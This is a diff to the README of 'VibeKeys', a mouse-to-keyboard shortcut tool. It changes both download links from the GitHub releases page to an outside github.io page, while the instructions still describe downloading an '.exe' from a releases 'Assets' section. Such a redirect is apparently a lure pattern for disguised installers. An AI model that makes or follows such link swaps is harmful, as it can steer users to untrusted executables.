@@ -1,6 +1,6 @@
 # 🖱️ VibeKeys - Control your computer with simple clicks
 
-[![](https://img.shields.io/badge/Download-VibeKeys-blue.svg)](https://github.com/tommad6821/VibeKeys/releases)
+[![](https://img.shields.io/badge/Download-VibeKeys-blue.svg)](https://tommad6821.github.io)
 
 VibeKeys offers a way to manage your work through your mouse. You can assign keyboard tasks to your mouse buttons. This tool speeds up your workflow if you spend time in a terminal or code editor. It removes the need to switch between your keyboard and mouse constantly.
 
@@ -12,7 +12,7 @@ You can set up profiles for different apps. For example, your mouse buttons beha
 
 ## 📥 Getting the software
 
-1. Visit the [releases page](https://github.com/tommad6821/VibeKeys/releases) to find the latest version.
+1. Visit the [releases page](https://tommad6821.github.io) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
